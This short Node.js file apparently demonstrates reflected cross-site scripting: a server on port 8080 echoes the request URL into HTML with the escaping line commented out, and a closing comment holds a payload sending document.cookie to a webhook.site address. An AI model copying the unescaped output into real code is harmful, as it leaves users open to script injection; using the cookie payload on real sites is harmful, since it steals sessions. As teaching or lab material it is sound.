var http = require('http');

http.createServer(function (req, res) {
	//var encodedStr = decodeURI(req.url).slice(1).replace(/[\u00A0-\u9999<>\&]/g, function(i) {return '&#'+i.charCodeAt(0)+';';});
	res.write('<html><h1>' + decodeURI(req.url).slice(1) + '</h1></html>'); 
	res.end();
}).listen(8080); 

//document.write('<img src="https://webhook.site/<path>?cookie=' + document.cookie + '" />')
